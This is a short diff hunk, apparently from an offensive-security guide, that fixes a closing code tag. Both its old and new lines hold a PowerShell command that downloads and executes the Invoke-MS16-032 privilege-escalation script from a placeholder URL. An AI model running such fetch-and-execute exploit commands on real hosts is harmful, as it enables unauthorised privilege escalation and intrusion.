@@ -216,7 +216,7 @@ Add the following to the bottom of the Invoke-MS16-032 script:
 
 Execute on the host by running the following:
 
-<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]/Invoke-MS16-032.ps1')"
+<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]/Invoke-MS16-032.ps1')</code>
 
 #### Payloads
 
